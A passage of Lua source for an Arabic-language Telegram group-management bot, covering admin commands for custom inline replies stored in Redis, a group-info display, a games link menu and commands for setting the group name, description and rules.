  bot.sendText(msg.chat_id,msg.id,"• تم مسح الرد من الردود الانلاين ","md",true)  
  return false
  end
  end
  if text == ("مسح الردود الانلاين") then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
    local list = redis:smembers(bot_id.."List:Manager:inline"..msg.chat_id.."")
    for k,v in pairs(list) do
        redis:del(bot_id.."Add:Rd:Manager:Gif:inline"..v..msg.chat_id)   
        redis:del(bot_id.."Add:Rd:Manager:Vico:inline"..v..msg.chat_id)   
        redis:del(bot_id.."Add:Rd:Manager:Stekrs:inline"..v..msg.chat_id)     
        redis:del(bot_id.."Add:Rd:Manager:Text:inline"..v..msg.chat_id)   
        redis:del(bot_id.."Add:Rd:Manager:Photo:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:Photoc:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:Video:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:Videoc:inline"..v..msg.chat_id)  
        redis:del(bot_id.."Add:Rd:Manager:File:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:video_note:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:Audio:inline"..v..msg.chat_id)
        redis:del(bot_id.."Add:Rd:Manager:Audioc:inline"..v..msg.chat_id)
        redis:del(bot_id.."Rd:Manager:inline:v"..v..msg.chat_id)
        redis:del(bot_id.."Rd:Manager:inline:link"..v..msg.chat_id)
    redis:del(bot_id.."List:Manager:inline"..msg.chat_id)
    end
    return bot.sendText(msg.chat_id,msg.id,"• تم مسح قائمه ردود الانلاين","md",true)  
    end
  if text == "اضف رد انلاين" then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
    redis:set(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id,true)
    local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelamr'},
    },
    }
    }
    return bot.sendText(msg.chat_id,msg.id,"• ارسل الان الكلمه لاضافتها في ردود الانلاين ","md",false, false, false, false, reply_markup)
  end
  if text and text:match("^(.*)$") and tonumber(msg.sender.user_id) ~= tonumber(bot_id) then
    if redis:get(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id) == "true" then
    redis:set(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id,"true1")
    redis:set(bot_id.."Text:Manager:inline"..msg.sender.user_id..":"..msg.chat_id, text)
    redis:del(bot_id.."Add:Rd:Manager:Gif:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Vico:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Stekrs:inline"..text..msg.chat_id)     
    redis:del(bot_id.."Add:Rd:Manager:Text:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Photo:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Photoc:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Video:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Videoc:inline"..text..msg.chat_id)  
    redis:del(bot_id.."Add:Rd:Manager:File:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:video_note:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Audio:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Audioc:inline"..text..msg.chat_id)
    redis:del(bot_id.."Rd:Manager:inline:text"..text..msg.chat_id)
    redis:del(bot_id.."Rd:Manager:inline:link"..text..msg.chat_id)
    redis:sadd(bot_id.."List:Manager:inline"..msg.chat_id.."", text)
    bot.sendText(msg.chat_id,msg.id,[[
    • ارسل لي الرد سواء اكان
    ❨ ملف ، ملصق ، متحركه ، صوره
     ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
    • يمكنك اضافة :
    ━━━━━━━━━━━━━━━━
     `#name` ↬ اسم المستخدم
     `#username` ↬ معرف المستخدم
     `#msgs` ↬ عدد الرسائل
     `#id` ↬ ايدي المستخدم
     `#stast` ↬ رتبة المستخدم
     `#edit` ↬ عدد التعديلات
    
    ]],"md",true)  
    return false
    end
    end

  if text and redis:get(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id) == "set_inline" then
  redis:set(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id, "set_link")
  local anubis = redis:get(bot_id.."Text:Manager:inline"..msg.sender.user_id..":"..msg.chat_id)
  redis:set(bot_id.."Rd:Manager:inline:text"..anubis..msg.chat_id, text)
  bot.sendText(msg.chat_id,msg.id,"• الان ارسل الرابط","md",true)  
  return false  
  end
  if text and redis:get(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id) == "set_link" then
  redis:del(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id)
  local anubis = redis:get(bot_id.."Text:Manager:inline"..msg.sender.user_id..":"..msg.chat_id)
  redis:set(bot_id.."Rd:Manager:inline:link"..anubis..msg.chat_id, text)
  bot.sendText(msg.chat_id,msg.id,"• تم اضافه الرد بنجاح","md",true)  
  return false  
  end
  if text and not redis:get(bot_id.."Status:Reply:inline"..msg.chat_id) then
  local btext = redis:get(bot_id.."Rd:Manager:inline:text"..text..msg.chat_id)
  local blink = redis:get(bot_id.."Rd:Manager:inline:link"..text..msg.chat_id)
  local anemi = redis:get(bot_id.."Add:Rd:Manager:Gif:inline"..text..msg.chat_id)   
  local veico = redis:get(bot_id.."Add:Rd:Manager:Vico:inline"..text..msg.chat_id)   
  local stekr = redis:get(bot_id.."Add:Rd:Manager:Stekrs:inline"..text..msg.chat_id)     
  local Texingt = redis:get(bot_id.."Add:Rd:Manager:Text:inline"..text..msg.chat_id)   
  local photo = redis:get(bot_id.."Add:Rd:Manager:Photo:inline"..text..msg.chat_id)
  local photoc = redis:get(bot_id.."Add:Rd:Manager:Photoc:inline"..text..msg.chat_id)
  local video = redis:get(bot_id.."Add:Rd:Manager:Video:inline"..text..msg.chat_id)
  local videoc = redis:get(bot_id.."Add:Rd:Manager:Videoc:inline"..text..msg.chat_id)  
  local document = redis:get(bot_id.."Add:Rd:Manager:File:inline"..text..msg.chat_id)
  local audio = redis:get(bot_id.."Add:Rd:Manager:Audio:inline"..text..msg.chat_id)
  local audioc = redis:get(bot_id.."Add:Rd:Manager:Audioc:inline"..text..msg.chat_id)
  local video_note = redis:get(bot_id.."Add:Rd:Manager:video_note:inline"..text..msg.chat_id)
  local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = btext , url = blink},
    },
    }
    }
  if Texingt then 
  local UserInfo = bot.getUser(msg.sender.user_id)
  local NumMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
  local TotalMsg = Total_message(NumMsg) 
  local Status_Gps = Get_Rank(msg.sender.user_id,msg.chat_id)
  local NumMessageEdit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
  local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
  local Texingt = Texingt:gsub('#name',UserInfo.first_name)
  local Texingt = Texingt:gsub('#id',msg.sender.user_id)
  local Texingt = Texingt:gsub('#edit',NumMessageEdit)
  local Texingt = Texingt:gsub('#msgs',NumMsg)
  local Texingt = Texingt:gsub('#stast',Status_Gps)
  bot.sendText(msg.chat_id,msg.id,'['..Texingt..']',"md",false, false, false, false, reply_markup)  
  end
  if video_note then
  bot.sendVideoNote(msg.chat_id, msg.id, video_note, nil, nil, nil, nil, nil, nil, nil, reply_markup)
  end
  if photo then
  bot.sendPhoto(msg.chat_id, msg.id, photo,photoc,"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
  end  
  if stekr then 
  bot.sendSticker(msg.chat_id, msg.id, stekr,nil,nil,nil,nil,nil,nil,nil,reply_markup)
  end
  if veico then 
  bot.sendVoiceNote(msg.chat_id, msg.id, veico, '', 'md',nil, nil, nil, nil, reply_markup)
  end
  if video then 
  bot.sendVideo(msg.chat_id, msg.id, video, videoc, "md", true, nil, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
  end
  if anemi then 
  bot.sendAnimation(msg.chat_id,msg.id, anemi, '', 'md', nil, nil, nil, nil, nil, nil, nil, nil,reply_markup)
  end
  if document then
  bot.sendDocument(msg.chat_id, msg.id, document, '', 'md',nil, nil, nil, nil,nil, reply_markup)
  end  
  if audio then
  bot.sendAudio(msg.chat_id, msg.id, audio, audioc, "md", nil, nil, nil, nil, nil, nil, nil, nil,reply_markup) 
  end
  end
  if text == ("الردود الانلاين") then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
    local list = redis:smembers(bot_id.."List:Manager:inline"..msg.chat_id.."")
    text = "• قائمه الردود الانلاين \n━━━━━━━━\n"
    for k,v in pairs(list) do
    if redis:get(bot_id.."Add:Rd:Manager:Gif:inline"..v..msg.chat_id) then
    db = "متحركه 🎭"
    elseif redis:get(bot_id.."Add:Rd:Manager:Vico:inline"..v..msg.chat_id) then
    db = "بصمه 📢"
    elseif redis:get(bot_id.."Add:Rd:Manager:Stekrs:inline"..v..msg.chat_id) then
    db = "ملصق 🃏"
    elseif redis:get(bot_id.."Add:Rd:Manager:Text:inline"..v..msg.chat_id) then
    db = "رساله ✉"
    elseif redis:get(bot_id.."Add:Rd:Manager:Photo:inline"..v..msg.chat_id) then
    db = "صوره 🎇"
    elseif redis:get(bot_id.."Add:Rd:Manager:Video:inline"..v..msg.chat_id) then
    db = "فيديو 📹"
    elseif redis:get(bot_id.."Add:Rd:Manager:File:inline"..v..msg.chat_id) then
    db = "ملف •"
    elseif redis:get(bot_id.."Add:Rd:Manager:Audio:inline"..v..msg.chat_id) then
    db = "اغنيه 🎵"
    elseif redis:get(bot_id.."Add:Rd:Manager:video_note:inline"..v..msg.chat_id) then
    db = "بصمه فيديو 🎥"
    end
    text = text..""..k.." » (" ..v.. ") » (" ..db.. ")\n"
    end
    if #list == 0 then
    text = "• عذرا لا يوجد ردود انلاين في المجموعة"
    end
    return bot.sendText(msg.chat_id,msg.id,"["..text.."]","md",true)  
    end
------------------------
if text == "مسح رد انلاين عام" or text == "مسح رد عام انلاين" then
if not programmer(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الثانوي* ',"md",true)  
end
    local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelamr'},
    },
    }
    }
    redis:set(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id,"true2")
    return bot.sendText(msg.chat_id,msg.id,"• ارسل الان الكلمه لمسحها من الردود الانلاين العامه","md",false, false, false, false, reply_markup)
    end 
  if text and text:match("^(.*)$") then
  if redis:get(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id.."") == "true2" then
    redis:del(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..text)     
    redis:del(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Photocc:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Videocc:inlinee"..text)  
    redis:del(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Audiocc:inlinee"..text)
    redis:del(bot_id.."Rdd:Managerr:inlinee:textt"..text)
    redis:del(bot_id.."Rdd:Managerr:inlinee:linkk"..text)
  redis:del(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id.."")
  redis:srem(bot_id.."Listt:Managerr:inlinee", text)
  bot.sendText(msg.chat_id,msg.id,"• تم مسح الرد من الردود الانلاين العامه","md",true)  
  return false
  end
  end
  if text == ("مسح الردود الانلاين العامه") then
if not programmer(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الثانوي* ',"md",true)  
end
    local list = redis:smembers(bot_id.."Listt:Managerr:inlinee")
    for k,v in pairs(list) do
        redis:del(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..v)   
        redis:del(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..v)   
        redis:del(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..v)     
        redis:del(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..v)   
        redis:del(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..v)
        redis:del(bot_id.."Addd:Rdd:Managerr:Photocc:inlinee"..v)
        redis:del(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..v)
        redis:del(bot_id.."Addd:Rdd:Managerr:Videocc:inlinee"..v)  
        redis:del(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..v)
        redis:del(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..v)
        redis:del(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..v)
        redis:del(bot_id.."Add:Rd:Manager:Audiocc:inlinee"..v)
        redis:del(bot_id.."Rdd:Managerr:inlinee:vv"..v)
        redis:del(bot_id.."Rdd:Managerr:inlinee:linkk"..v)
    redis:del(bot_id.."Listt:Managerr:inlinee")
    end
    return bot.sendText(msg.chat_id,msg.id,"• تم مسح قائمه ردود الانلاين العامه","md",true)  
    end
  if text == "اضف رد انلاين عام" or text == "اضف رد عام انلاين" then
if not programmer(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الثانوي* ',"md",true)  
end
    redis:set(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id,true)
    local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelamr'},
    },
    }
    }
    return bot.sendText(msg.chat_id,msg.id,"• ارسل الان الكلمه لاضافتها في ردود الانلاين العامه","md",false, false, false, false, reply_markup)
  end
  if text and text:match("^(.*)$") and tonumber(msg.sender.user_id) ~= tonumber(bot_id) then
    if redis:get(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id) == "true" then
    redis:set(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id,"true1")
    redis:set(bot_id.."Textt:Managerr:inlinee"..msg.sender.user_id.."", text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..text)     
    redis:del(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..text)   
    redis:del(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Photocc:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Videocc:inlinee"..text)  
    redis:del(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..text)
    redis:del(bot_id.."Addd:Rdd:Managerr:Audiocc:inlinee"..text)
    redis:del(bot_id.."Rdd:Managerr:inlinee:textt"..text)
    redis:del(bot_id.."Rdd:Managerr:inlinee:linkk"..text)
    redis:sadd(bot_id.."Listt:Managerr:inlinee", text)
    bot.sendText(msg.chat_id,msg.id,[[
    • ارسل لي الرد سواء اكان
    ❨ ملف ، ملصق ، متحركه ، صوره
     ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
    • يمكنك اضافة :
    ━━━━━━━━━━━━━━━━
     `#name` ↬ اسم المستخدم
     `#username` ↬ معرف المستخدم
     `#msgs` ↬ عدد الرسائل
     `#id` ↬ ايدي المستخدم
     `#stast` ↬ رتبة المستخدم
     `#edit` ↬ عدد التعديلات
    
    ]],"md",true)  
    return false
    end
    end

  if text and redis:get(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id) == "set_inlinee" then
  redis:set(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id, "set_linkk")
  local anubis = redis:get(bot_id.."Textt:Managerr:inlinee"..msg.sender.user_id)
  redis:set(bot_id.."Rdd:Managerr:inlinee:textt"..anubis, text)
  bot.sendText(msg.chat_id,msg.id,"• الان ارسل الرابط","md",true)  
  return false  
  end
  if text and redis:get(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id) == "set_linkk" then
  redis:del(bot_id.."Sett:Managerr:rdd:inlinee"..msg.sender.user_id..":"..msg.chat_id)
  local anubis = redis:get(bot_id.."Textt:Managerr:inlinee"..msg.sender.user_id)
  redis:set(bot_id.."Rdd:Managerr:inlinee:linkk"..anubis, text)
  bot.sendText(msg.chat_id,msg.id,"• تم اضافه الرد بنجاح","md",true)  
  return false  
  end
  if text and not redis:get(bot_id.."Statuss:Replyy:inlinee"..msg.chat_id) then
  local btext = redis:get(bot_id.."Rdd:Managerr:inlinee:textt"..text)
  local blink = redis:get(bot_id.."Rdd:Managerr:inlinee:linkk"..text)
  local anemi = redis:get(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..text)   
  local veico = redis:get(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..text)   
  local stekr = redis:get(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..text)     
  local Texingt = redis:get(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..text)   
  local photo = redis:get(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..text)
  local photoc = redis:get(bot_id.."Addd:Rdd:Managerr:Photocc:inlinee"..text)
  local video = redis:get(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..text)
  local videoc = redis:get(bot_id.."Addd:Rdd:Managerr:Videocc:inlinee"..text)  
  local document = redis:get(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..text)
  local audio = redis:get(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..text)
  local audioc = redis:get(bot_id.."Addd:Rdd:Managerr:Audiocc:inlinee"..text)
  local video_note = redis:get(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..text)
  local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = btext , url = blink},
    },
    }
    }
  if Texingt then 
  local UserInfo = bot.getUser(msg.sender.user_id)
  local NumMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
  local TotalMsg = Total_message(NumMsg) 
  local Status_Gps = Get_Rank(msg.sender.user_id,msg.chat_id)
  local NumMessageEdit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
  local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
  local Texingt = Texingt:gsub('#name',UserInfo.first_name)
  local Texingt = Texingt:gsub('#id',msg.sender.user_id)
  local Texingt = Texingt:gsub('#edit',NumMessageEdit)
  local Texingt = Texingt:gsub('#msgs',NumMsg)
  local Texingt = Texingt:gsub('#stast',Status_Gps)
  bot.sendText(msg.chat_id,msg.id,'['..Texingt..']',"md",false, false, false, false, reply_markup)  
  end
  if video_note then
  bot.sendVideoNote(msg.chat_id, msg.id, video_note, nil, nil, nil, nil, nil, nil, nil, reply_markup)
  end
  if photo then
  bot.sendPhoto(msg.chat_id, msg.id, photo,photoc,"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
  end  
  if stekr then 
  bot.sendSticker(msg.chat_id, msg.id, stekr,nil,nil,nil,nil,nil,nil,nil,reply_markup)
  end
  if veico then 
  bot.sendVoiceNote(msg.chat_id, msg.id, veico, '', 'md',nil, nil, nil, nil, reply_markup)
  end
  if video then 
  bot.sendVideo(msg.chat_id, msg.id, video, videoc, "md", true, nil, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
  end
  if anemi then 
  bot.sendAnimation(msg.chat_id,msg.id, anemi, '', 'md', nil, nil, nil, nil, nil, nil, nil, nil,reply_markup)
  end
  if document then
  bot.sendDocument(msg.chat_id, msg.id, document, '', 'md',nil, nil, nil, nil,nil, reply_markup)
  end  
  if audio then
  bot.sendAudio(msg.chat_id, msg.id, audio, audioc, "md", nil, nil, nil, nil, nil, nil, nil, nil,reply_markup) 
  end
  end
  if text == ("الردود الانلاين العامه") then
if not programmer(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الثانوي* ',"md",true)  
end
    local list = redis:smembers(bot_id.."Listt:Managerr:inlinee")
    text = "• قائمه الردود الانلاين العامه \n━━━━━━━━\n"
    for k,v in pairs(list) do
    if redis:get(bot_id.."Addd:Rdd:Managerr:Giff:inlinee"..v) then
    db = "متحركه 🎭"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Vicoo:inlinee"..v) then
    db = "بصمه 📢"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Stekrss:inlinee"..v) then
    db = "ملصق 🃏"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Textt:inlinee"..v) then
    db = "رساله ✉"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Photoo:inlinee"..v) then
    db = "صوره 🎇"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Videoo:inlinee"..v) then
    db = "فيديو 📹"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Filee:inlinee"..v) then
    db = "ملف •"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:Audioo:inlinee"..v) then
    db = "اغنيه 🎵"
    elseif redis:get(bot_id.."Addd:Rdd:Managerr:video_notee:inlinee"..v) then
    db = "بصمه فيديو 🎥"
    end
    text = text..""..k.." » (" ..v.. ") » (" ..db.. ")\n"
    end
    if #list == 0 then
    text = "• عذرا لا يوجد ردود انلاين عامه"
    end
    return bot.sendText(msg.chat_id,msg.id,"["..text.."]","md",true)  
    end
----------------
if text == 'المجموعة' or text == 'عدد المجموعة' or text == 'عدد المجموعة' then
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},
}
}
bot.sendText(msg.chat_id,msg.id,'\n*• معلومات المجموعة :\n• الايدي ↢ '..msg.chat_id..' \n• عدد الاعضاء ↢ '..Info_Chats.member_count..'\n• عدد الادمنيه ↢ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↢ '..Info_Chats.banned_count..'\n• عدد المقيدين ↢ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md",true, false, false, false, reply_markup)
return false
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
if text == 'الالعاب الاحترافيه' or text == 'الالعاب المتطوره' and Vips(msg) then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text="♟ Chess Game ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحداني فالرياضيات 🔢",url='https://t.me/gamebot?game=MathBattle'}},
{{text="تحداني في ❌⭕️",url='t.me/XO_AABOT?start3836619'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="دومنا🥇",url='https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby'},{text="❕ليدو",url='https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 Dragon Game 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 3D Snake Game 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 Color Game 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 Rocket Game 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 Arrow Game 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*• قائمه الالعاب المتطورة *',"md", true, false, false, false, reply_markup)
end
end 
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add")
if text and text:match("^https://t.me/+(.*)$") then     
redis:set(bot_id..":"..msg.chat_id..":link",text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الرابط الجديد *","md", true)
else
bot.sendText(msg.chat_id,msg.id,"*• عذرا الرابط خطأ*","md", true)
end
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":iid:adds") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":iid:adds")
redis:set(bot_id..":iid",text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الايدي العام الجديد *","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add")
redis:set(bot_id..":"..msg.chat_id..":id",text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الايدي الجديد *","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add")
redis:set(bot_id..":"..msg.chat_id..":Welcome",text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الترحيب الجديد *","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add")
if GetInfoBot(msg).Info == false then
bot.sendText(msg.chat_id,msg.id,'*• ليس لدي صلاحيات تغيير المعلومات*',"md",true)  
return false
end
bot.setChatTitle(msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الاسم *","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add")
if GetInfoBot(msg).Info == false then
bot.sendText(msg.chat_id,msg.id,'*• ليس لدي صلاحيات تغيير المعلومات*',"md",true)  
return false
end
bot.setChatDescription(msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الوصف *","md", true)
end
if BasicConstructor(msg) then
if text == 'تغيير اسم المجموعة' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add",true)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الاسم الجديد الان*","md", true)
end
if text == 'تغيير الوصف' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add",true)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الوصف الجديد الان*","md", true)
end
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add")
redis:set(bot_id..":"..msg.chat_id..":Law",text)
bot.sendText(msg.chat_id,msg.id,"*- تم حفظ القوانين *","md", true)
end
if Owner(msg) then
if text == 'تعين قوانين' or text == 'تعيين قوانين' or text == 'وضع قوانين' or text == 'اضف قوانين' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add",true)
